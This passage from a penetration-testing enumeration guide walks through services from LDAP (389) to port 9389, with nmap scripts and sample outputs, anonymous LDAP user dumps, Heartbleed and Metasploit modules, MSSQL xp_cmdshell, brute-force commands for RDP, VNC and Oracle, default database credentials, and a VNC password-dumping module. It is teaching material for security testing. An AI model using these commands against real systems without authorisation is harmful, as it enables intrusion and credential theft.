<a href="https://nmap.org/nsedoc/scripts/ldap-rootdse.html" class="reference external">ldap-rootdse.nse</a> : Retrieves the LDAP root DSA-specific Entry (DSE)

Sample Output:

    nmap -p 389 --script ldap-rootdse <host>
    nmap -p 389 --script ldap-rootdse 172.16.xx.xx

    Starting Nmap 7.01 (https://nmap.org) at 2016-05-03 23:05 IST
    Nmap scan report for 172.16.xx.xx
    Host is up (0.015s latency).
    PORT    STATE SERVICE
    389/tcp open  ldap
    | ldap-rootdse:
    | LDAP Results
    |   <ROOT>
    |       currentTime: 20160503173447.0Z
    |       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=xxxpcx,DC=com
    |       dsServiceName: CN=NTDS Settings,CN=SCN-DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=xxxpcx,DC=com
    |       namingContexts: DC=xxxpcx,DC=com
    |       namingContexts: CN=Configuration,DC=xxxpcx,DC=com
    |       namingContexts: CN=Schema,CN=Configuration,DC=xxxpcx,DC=com
    |       namingContexts: DC=DomainDnsZones,DC=xxxpcx,DC=com
    |       namingContexts: DC=ForestDnsZones,DC=xxxpcx,DC=com
    |       defaultNamingContext: DC=xxxpcx,DC=com
    |       schemaNamingContext: CN=Schema,CN=Configuration,DC=xxxpcx,DC=com
    |       configurationNamingContext: CN=Configuration,DC=xxxpcx,DC=com
    |       rootDomainNamingContext: DC=xxxpcx,DC=com
    |       supportedControl: 1.2.xx.xx.1.4.319
    |       supportedControl: 1.2.xx.xx.1.4.801
    |       supportedControl: 1.2.xx.xx.1.4.473
    |       supportedControl: 1.2.xx.xx.1.4.528
    |       supportedControl: 1.2.xx.xx.1.4.417
    |       supportedControl: 1.2.xx.xx.1.4.619
    |       supportedControl: 1.2.xx.xx.1.4.841
    |       supportedControl: 1.2.xx.xx.1.4.529
    |       supportedControl: 1.2.xx.xx.1.4.805
    |       supportedControl: 1.2.xx.xx.1.4.521
    |       supportedControl: 1.2.xx.xx.1.4.970
    |       supportedControl: 1.2.xx.xx.1.4.1338
    |       supportedControl: 1.2.xx.xx.1.4.474
    |       supportedControl: 1.2.xx.xx.1.4.1339
    |       supportedControl: 1.2.xx.xx.1.4.1340
    |       supportedControl: 1.2.xx.xx.1.4.1413
    |       supportedControl: 2.16.xx.xx.113730.3.4.9
    |       supportedControl: 2.16.xx.xx.113730.3.4.10
    |       supportedControl: 1.2.xx.xx.1.4.1504
    |       supportedControl: 1.2.xx.xx.1.4.1852
    |       supportedControl: 1.2.xx.xx.1.4.802
    |       supportedControl: 1.2.xx.xx.1.4.1907
    |         supportedControl: 1.2.xx.xx.1.4.1948
    |       supportedControl: 1.2.xx.xx.1.4.1974
    |       supportedControl: 1.2.xx.xx.1.4.1341
    |       supportedControl: 1.2.xx.xx.1.4.2026
    |       supportedControl: 1.2.xx.xx.1.4.2064
    |       supportedControl: 1.2.xx.xx.1.4.2065
    |       supportedControl: 1.2.xx.xx.1.4.2066
    |       supportedControl: 1.2.xx.xx.1.4.2090
    |       supportedControl: 1.2.xx.xx.1.4.2205
    |       supportedControl: 1.2.xx.xx.1.4.2204
    |       supportedControl: 1.2.xx.xx.1.4.2206
    |       supportedControl: 1.2.xx.xx.1.4.2211
    |       supportedControl: 1.2.xx.xx.1.4.2239
    |       supportedControl: 1.2.xx.xx.1.4.2255
    |       supportedControl: 1.2.xx.xx.1.4.2256
    |       supportedLDAPVersion: 3
    |       supportedLDAPVersion: 2
    |       supportedLDAPPolicies: MaxPoolThreads
    |       supportedLDAPPolicies: MaxPercentDirSyncRequests
    |       supportedLDAPPolicies: MaxDatagramRecv
    |       supportedLDAPPolicies: MaxReceiveBuffer
    |       supportedLDAPPolicies: InitRecvTimeout
    |       supportedLDAPPolicies: MaxConnections
    |       supportedLDAPPolicies: MaxConnIdleTime
    |       supportedLDAPPolicies: MaxPageSize
    |       supportedLDAPPolicies: MaxBatchReturnMessages
    |       supportedLDAPPolicies: MaxQueryDuration
    |       supportedLDAPPolicies: MaxTempTableSize
    |       supportedLDAPPolicies: MaxResultSetSize
    |       supportedLDAPPolicies: MinResultSets
    |       supportedLDAPPolicies: MaxResultSetsPerConn
    |       supportedLDAPPolicies: MaxNotificationPerConn
    |       supportedLDAPPolicies: MaxValRange
    |       supportedLDAPPolicies: MaxValRangeTransitive
    |       supportedLDAPPolicies: ThreadMemoryLimit
    |       supportedLDAPPolicies: SystemMemoryLimitPercent
    |       highestCommittedUSN: 70892
    |       supportedSASLMechanisms: GSSAPI
    |       supportedSASLMechanisms: GSS-SPNEGO
    |       supportedSASLMechanisms: EXTERNAL
    |       supportedSASLMechanisms: DIGEST-MD5
    |       dnsHostName: SCN-DC01.xxxpcx.com
    |       ldapServiceName: xxxpcx.com:scn-dc01$@xxxpcx.COM
    |       serverName: CN=SCN-DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=xxxpcx,DC=com
    |       supportedCapabilities: 1.2.xx.xx.1.4.800
    |       supportedCapabilities: 1.2.xx.xx.1.4.1670
    |       supportedCapabilities: 1.2.xx.xx.1.4.1791
    |       supportedCapabilities: 1.2.xx.xx.1.4.1935
    |       supportedCapabilities: 1.2.xx.xx.1.4.2080
    |       supportedCapabilities: 1.2.xx.xx.1.4.2237
    |       isSynchronized: TRUE
    |       isGlobalCatalogReady: TRUE
    |       domainFunctionality: 3
    |       forestFunctionality: 3
    |_      domainControllerFunctionality: 6

    Nmap done: 1 IP address (1 host up) scanned in 0.26 seconds

### ldap-search

<a href="https://nmap.org/nsedoc/scripts/ldap-search.html" class="reference external">ldap-search.nse</a> : Attempts to perform an LDAP search and returns all matches.

If no username and password is supplied to the script the Nmap registry is consulted. If the ldap-brute script has been selected and it found a valid account, this account will be used. If not anonymous bind will be used as a last attempt.

Sample Output:

    nmap -p 389 --script ldap-search --script-args 'ldap.username="cn=ldaptest,cn=users,dc=cqure,dc=net",ldap.password=ldaptest,
    ldap.qfilter=users,ldap.attrib=sAMAccountName' <host>

    nmap -p 389 --script ldap-search --script-args 'ldap.username="cn=ldaptest,cn=users,dc=cqure,dc=net",ldap.password=ldaptest,
    ldap.qfilter=custom,ldap.searchattrib="operatingSystem",ldap.searchvalue="Windows *Server*",ldap.attrib={operatingSystem,whencreated,OperatingSystemServicePack}' <host>

### ldap-brute

<a href="https://nmap.org/nsedoc/scripts/ldap-brute.html" class="reference external">ldap-brute.nse</a> : Attempts to brute-force LDAP authentication. By default it uses the built-in username and password lists. In order to use your own lists use the userdb and passdb script arguments. This script does not make any attempt to prevent account lockout! If the number of passwords in the dictionary exceeds the amount of allowed tries, accounts will be locked out. This usually happens very quickly.

## Other

### ldapsearch

Anonymous LDAP Binding allows a client to connect and search the directory (bind and search) without logging in. You do not need to include binddn and bindpasswd.

If the port 389 supports Anonymous Bind, we may try searching for the base by using doing a ldap search query

    ldapsearch -h 10.10.xx.xx -p 389 -x -s base -b '' "(objectClass=*)" "*" +
    -h ldap server
    -p port of ldap
    -x simple authentication
    -b search base
    -s scope is defined as base

Sample Output
```
    ldapsearch -h 10.10.xx.xx -p 389 -x -s base -b '' "(objectClass=*)" "*" +
    # extended LDIF
    #
    # LDAPv3
    # base <> with scope baseObject
    # filter: (objectClass=*)
    # requesting: * +
    #

    #
    dn:
    objectClass: top
    objectClass: OpenLDAProotDSE
    structuralObjectClass: OpenLDAProotDSE
    configContext: cn=config
    namingContexts: dc=example,dc=com
    supportedControl: 1.3.xx.xx.4.1.4203.1.9.1.1
    supportedControl: 2.16.xx.xx.113730.3.4.18
    supportedControl: 2.16.xx.xx.113730.3.4.2
    supportedControl: 1.3.xx.xx.4.1.4203.1.10.1
    supportedControl: 1.2.xx.xx.1.4.319
    supportedControl: 1.2.xx.xx.1.334810.2.3
    supportedControl: 1.2.xx.xx.1.3344810.2.3
    supportedControl: 1.3.xx.xx.1.13.2
    supportedControl: 1.3.xx.xx.1.13.1
    supportedControl: 1.3.xx.xx.1.12
    supportedExtension: 1.3.xx.xx.4.1.4203.1.11.1
    supportedExtension: 1.3.xx.xx.4.1.4203.1.11.3
    supportedFeatures: 1.3.xx.xx.1.14
    supportedFeatures: 1.3.xx.xx.4.1.4203.1.5.1
    supportedFeatures: 1.3.xx.xx.4.1.4203.1.5.2
    supportedFeatures: 1.3.xx.xx.4.1.4203.1.5.3
    supportedFeatures: 1.3.xx.xx.4.1.4203.1.5.4
    supportedFeatures: 1.3.xx.xx.4.1.4203.1.5.5
    supportedLDAPVersion: 3
    entryDN:
    subschemaSubentry: cn=Subschema

    # search result
    search: 2
    result: 0 Success

    # numResponses: 2
    # numEntries: 1
```
Once you are aware of the base name in the above example “example.com” we can query for ldap users etc. by

    ldapsearch -h 10.10.xx.xx -p 389 -x -b "dc=example,dc=com"

Sample Output

    # johnsmith, EXAUSERS, People, example.com
    dn: uid=johnsmith,ou=EXAUSERS,ou=People,dc=example,dc=com
    displayName: John Smith
    ntUserLastLogon: 130150432350834365
    givenName: John
    objectClass: top
    objectClass: person
    objectClass: organizationalperson
    objectClass: inetOrgPerson
    objectClass: ntUser
    objectClass: shadowAccount
    uid: johnsmith
    cn: John Smith
    ntUserCodePage: 0
    ntUserDomainId: johnsmith
    ntUserLastLogoff: 0
    ntUniqueId: 75ac21092c755e42b2129a224eb328dd
    ntUserDeleteAccount: true
    ntUserAcctExpires: 9223372036854775807
    sn: John


# Port 443 - HTTPS

Okay this is only here as a reminder to always check for SSL-vulnerabilities such as heartbleed. For more on how to exploit web-applications check out the chapter on [client-side vulnerabilities](../http-web-vulnerabilities/attacking-the-system/).

## HTTPS Enumeration <a id="443enum"></a>

1. Initial scan for misconfigurations and vulnerabilities with nikto:  
  `nikto -h https://10.10.10.140`

  > Make sure to run scan interesting directories as well!

2. Check SSL/TLS with sslscan: `sslscan`
3. Brute force to find hidden directories and items: `dirb`

## Common Vulnerabilities

**Heartbleed**

OpenSSL 1.0.1 through 1.0.1f \(inclusive\) are vulnerable  
OpenSSL 1.0.1g is NOT vulnerable  
OpenSSL 1.0.0 branch is NOT vulnerable  
OpenSSL 0.9.8 branch is NOT vulnerable

First we need to investigate if the https-page is vulnerable to [heartbleed](http://heartbleed.com/)

We can do that the following way.

```text
sudo sslscan 192.168.101.1:443
```

or using a nmap script

```text
nmap -sV --script=ssl-heartbleed 192.168.101.8
```

You can exploit the vulnerability in many different ways. There is a module for it in burp suite, and metasploit also has a module for it.

```text
use auxiliary/scanner/ssl/openssl_heartbleed
set RHOSTS 192.168.101.8
set verbose true
run
```

Now you have a flow of random data, some of it might be of interest to you.

**CRIME**

**Breach**

## Certificates

Read the certificate.

* Does it include names that might be useful?
* Correct vhost

# Port 548 - Apple Filing Protocol

AFP is a proprietary network protocol that offers file services for MAC OS X and original MAC OS.

## Metasploit

Two auxiliary modules available.

### Apple Filing Protocol Info Enumerator

    use auxiliary/scanner/afp/afp_server_info
    services -p 548 -u -S AFP -R

Sample output:
```
    [*] AFP 10.11.xx.xx Scanning...
    [*] AFP 10.11.xx.xx:548:548 AFP:
    [*] AFP 10.11.xx.xx:548 Server Name: example-airport-time-capsule
    [*] AFP 10.11.xx.xx:548  Server Flags:
    [*] AFP 10.11.xx.xx:548     *  Super Client: true
    [*] AFP 10.11.xx.xx:548     *  UUIDs: true
    [*] AFP 10.11.xx.xx:548     *  UTF8 Server Name: true
    [*] AFP 10.11.xx.xx:548     *  Open Directory: true
    [*] AFP 10.11.xx.xx:548     *  Reconnect: true
    [*] AFP 10.11.xx.xx:548     *  Server Notifications: true
    [*] AFP 10.11.xx.xx:548     *  TCP/IP: true
    [*] AFP 10.11.xx.xx:548     *  Server Signature: true
    [*] AFP 10.11.xx.xx:548     *  Server Messages: true
    [*] AFP 10.11.xx.xx:548     *  Password Saving Prohibited: false
    [*] AFP 10.11.xx.xx:548     *  Password Changing: true
    [*] AFP 10.11.xx.xx:548     *  Copy File: true
    [*] AFP 10.11.xx.xx:548  Machine Type: TimeCapsule8,119
    [*] AFP 10.11.xx.xx:548  AFP Versions: AFP3.3, AFP3.2, AFP3.1
    [*] AFP 10.11.xx.xx:548  UAMs: DHCAST128, DHX2, SRP, Recon1
    [*] AFP 10.11.xx.xx:548  Server Signature: 4338364c4e355635463948350069672d
    [*] AFP 10.11.xx.xx:548  Server Network Address:
    [*] AFP 10.11.xx.xx:548     *  10.11.4.76:548
    [*] AFP 10.11.xx.xx:548     *  [fe80:0009:0000:0000:9272:40ff:fe0b:99b7]:548
    [*] AFP 10.11.xx.xx:548     *  10.11.4.76
    [*] AFP 10.11.xx.xx:548   UTF8 Server Name: Example's AirPort Time Capsule
    [*] Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed
```
### Apple Filing Protocol Login Utility

Attempt to bruteforce authentication credentials for AFP.

## Nmap

### afp-serverinfo

<a href="https://nmap.org/nsedoc/scripts/afp-serverinfo.html" class="reference external">afp-serverinfo.nse</a> : Shows AFP server information.

### afp-brute

<a href="https://nmap.org/nsedoc/scripts/afp-brute.html" class="reference external">afp-brute.nse</a> : Performs password guessing against Apple Filing Protocol (AFP).

### afp-ls

<a href="https://nmap.org/nsedoc/scripts/afp-ls.html" class="reference external">afp-ls.nse</a> : Attempts to get useful information about files from AFP volumes. The output is intended to resemble the output of ls.

### afp-showmount

<a href="https://nmap.org/nsedoc/scripts/afp-showmount.html" class="reference external">afp-showmount.nse</a> : Shows AFP shares and ACLs.

### afp-path-vuln

<a href="https://nmap.org/nsedoc/scripts/afp-path-vuln.html" class="reference external">afp-path-vuln.nse</a> : Detects the Mac OS X AFP directory traversal vulnerability, CVE-2010-0533.

# Port 554 - RTSP

RTSP \(Real Time Streaming Protocol\) is a stateful protocol built on top of tcp usually used for streaming images. Many commercial IP-cameras are running on this port. They often have a GUI interface, so look out for that.

# Port 587 - Submission

Outgoing smtp-port

If Postfix is run on it it could be vunerable to shellshock  
[https://www.exploit-db.com/exploits/34896/](https://www.exploit-db.com/exploits/34896/)

# Port 631 - Cups

Common UNIX Printing System has become the standard for sharing printers on a linux-network.  
You will often see port 631 open in your priv-esc enumeration when you run `netstat`. You can log in to it here: [http://localhost:631/admin](http://localhost:631/admin)

You authenticate with the OS-users.

Find version. Test **cups-config --version**. If this does not work surf to [http://localhost:631/printers](http://localhost:631/printers) and see the CUPS version in the title bar of your browser.

There are vulnerabilities for it so check your searchsploit.

# Port 993 - Imap Encrypted

The default port for the Imap-protocol.

# Port 995 - POP3 Encrypten

Port 995 is the default port for the **Post Office Protocol**.  
The protocol is used for clients to connect to the server and download their emails locally.  
You usually see this port open on mx-servers. Servers that are meant to send and recieve email.

Related ports:  
110 is the POP3 non-encrypted.

25, 465

# Port 1025 - NFS or IIS

I have seen them open on windows machine. But nothing has been listening on it.

# Port 1030/1032/1033/1038

I think these are used by the RPC within Windows Domains. I have found no use for them so far. But they might indicate that the target is part of a Windows domain. Not sure though.

# Port 1433 - MsSQL

Default port for Microsoft SQL .

```text
sqsh -S 192.168.1.101 -U sa
```

## Execute commands

```bash
To execute the date command to the following after logging in
xp_cmdshell 'date'
go
```

Many o the scanning modules in metasploit requires authentication. But some do not.

```text
use auxiliary/scanner/mssql/mssql_ping
```

## Brute force.

```text
scanner/mssql/mssql_login
```

If you have credencials look in metasploit for other modules.

# Port 1521 - Oracle database

Enumeration

```text
tnscmd10g version -h 192.168.1.101
tnscmd10g status -h 192.168.1.101
```

Bruteforce the ISD

```text
auxiliary/scanner/oracle/sid_brute
```

Connect to the database with `sqlplus`

References:

[http://www.red-database-security.com/wp/itu2007.pdf](http://www.red-database-security.com/wp/itu2007.pdf)

# Ports 1748, 1754, 1808, 1809 - Oracle

These are also ports used by oracle on windows. They run Oracles **Intelligent Agent**.

# Port 2049 - NFS

Network file system  
This is a service used so that people can access certain parts of a remote filesystem. If this is badly configured it could mean that you grant excessive access to users.

If the service is on its default port you can run this command to see what the filesystem is sharing

```text
showmount -e 192.168.1.109
```

Then you can mount the filesystem to your machine using the following command

```text
mount 192.168.1.109:/ /tmp/NFS
mount -t 192.168.1.109:/ /tmp/NFS
```

Now we can go to /tmp/NFS and check out /etc/passwd, and add and remove files.

This can be used to escalate privileges if it is not correct configured. Check chapter on Linux Privilege Escalation.

# Port 2100 - Oracle XML DB

There are some exploits for this, so check it out. You can use the default Oracle users to access to it. You can use the normal ftp protocol to access it.

Can be accessed through ftp.  
Some default passwords here:  
[https://docs.oracle.com/cd/B10501\_01/win.920/a95490/username.htm](https://docs.oracle.com/cd/B10501_01/win.920/a95490/username.htm)  
Name:  
Version:

Default logins:  
sys:sys  
scott:tiger

# Port 3268 - globalcatLdap

# Port 3306 - MySQL

Always test the following:

Username: root

Password: root

```text
mysql --host=192.168.1.101 -u root -p
mysql -h <Hostname> -u root
mysql -h <Hostname> -u root@localhost
mysql -h <Hostname> -u ""@localhost

telnet 192.168.0.101 3306
```

You will most likely see this a lot:

```text
ERROR 1130 (HY000): Host '192.168.0.101' is not allowed to connect to this MySQL server
```

This occurs because mysql is configured so that the root user is only allowed to log in from 127.0.0.1. This is a reasonable security measure put up to protect the database.

## Configuration files

```text
cat /etc/my.cnf
```

[http://www.cyberciti.biz/tips/how-do-i-enable-remote-access-to-mysql-database-server.html](http://www.cyberciti.biz/tips/how-do-i-enable-remote-access-to-mysql-database-server.html)

## Mysql-commands cheat sheet

```text
http://cse.unl.edu/~sscott/ShowFiles/SQL/CheatSheet/SQLCheatSheet.html
```

## Uploading a shell

```text
You can also use mysql to upload a shell
```

## Escalating privileges

If mysql is started as root you might have a chance to use it as a way to escalate your privileges.

**MYSQL UDF INJECTION:**

[https://infamoussyn.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/](https://infamoussyn.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/)

## Finding passwords to mysql

You might gain access to a shell by uploading a reverse-shell. And then you need to escalate your privilege. One way to do that is to look into the databse and see what users and passwords that are available. Maybe someone is resuing a password?

So the first step is to find the login-credencials for the database. Those are usually found in some configuration-file oon the web-server. For example, in joomla they are found in:

```text
/var/www/html/configuration.php
```

In that file you find the

```php
<?php
class JConfig {
   var $mailfrom = 'admin@rainng.com';
   var $fromname = 'testuser';
   var $sendmail = '/usr/sbin/sendmail';
   var $password = 'myPassowrd1234';
   var $sitename = 'test';
   var $MetaDesc = 'Joomla! - the dynamic portal engine and content management system';
   var $MetaKeys = 'joomla, Joomla';
   var $offline_message = 'This site is down for maintenance. Please check back again soon.';
   }
```

# Port 3339 - Oracle web interface

# Port 3389 - Remote Desktop Protocol

This is a proprietary protocol developed by windows to allow remote desktop.

Log in like this

```text
rdesktop -u guest -p guest 10.11.1.5 -g 94%
```

Brute force like this

```text
ncrack -vv --user Administrator -P /root/passwords.txt rdp://192.168.1.101
```

## Ms12-020

This is categorized by microsoft as a RCE vulnerability. But there is no POC for it online. You can only DOS a machine using this exploit.

# Port 4445 - Upnotifyp

I have not found anything here. Try connecting with netcat and visiting in browser.

# Port 4555 - RSIP

I have seen this port being used by Apache James Remote Configuration.

There is an exploit for version 2.3.2

[https://www.exploit-db.com/docs/40123.pdf](https://www.exploit-db.com/docs/40123.pdf)

# Port 47001 - Windows Remote Management Service

Windows Remote Management Service

# Port 5357 - WSDAPI

# Port 5722 - DFSR

> The Distributed File System Replication \(DFSR\) service is a state-based, multi-master file replication engine that automatically copies updates to files and folders between computers that are participating in a common replication group. DFSR was added in Windows Server 2003 R2.

I am not sure how what can be done with this port. But if it is open it is a sign that the machine in question might be a Domain Controller.

# Port 5900 - VNC

VNC is used to get a screen for a remote host. But some of them have some exploits.

You can use vncviewer to connect to a vnc-service. Vncviewer comes built-in in Kali.

It defaults to port 5900. You do not have to set a username. VNC is run as a specific user, so when you use VNC it assumes that user. Also note that the password is not the user password on the machine. If you have dumped and cracked the user password on a machine does not mean you can use them to log in. To find the VNC password you can use the metasploit/meterpreter post exploit module that dumps VNC passwords

```text
background
use post/windows/gather/credentials/vnc
set session X
exploit
```

```text
vncviewer 192.168.1.109
```

## Ctr-alt-del

If you are unable to input ctr-alt-del \(kali might interpret it as input for kali\).

Try `shift-ctr-alt-del`

## Metasploit scanner

You can scan VNC for logins, with bruteforce.

**Login scan**

```text
use auxiliary/scanner/vnc/vnc_login
set rhosts 192.168.1.109
run
```

**Scan for no-auth**

```text
use auxiliary/scanner/vnc/vnc_none_auth
set rhosts 192.168.1.109
run
```

# Port 8080

Since this port is used by many different services. They are divided like this.

## Tomcat

Tomcat suffers from default passwords. There is even a module in metasploit that enumerates common tomcat passwords. And another module for exploiting it and giving you a shell.

# Port 9389 -

> Active Directory Administrative Center is installed by default on Windows Server 2008 R2 and is available on Windows 7 when you install the Remote Server Administration Tools \(RSAT\).

 References

{% embed url="http://www.0daysecurity.com/penetration-testing/enumeration.html​" %}
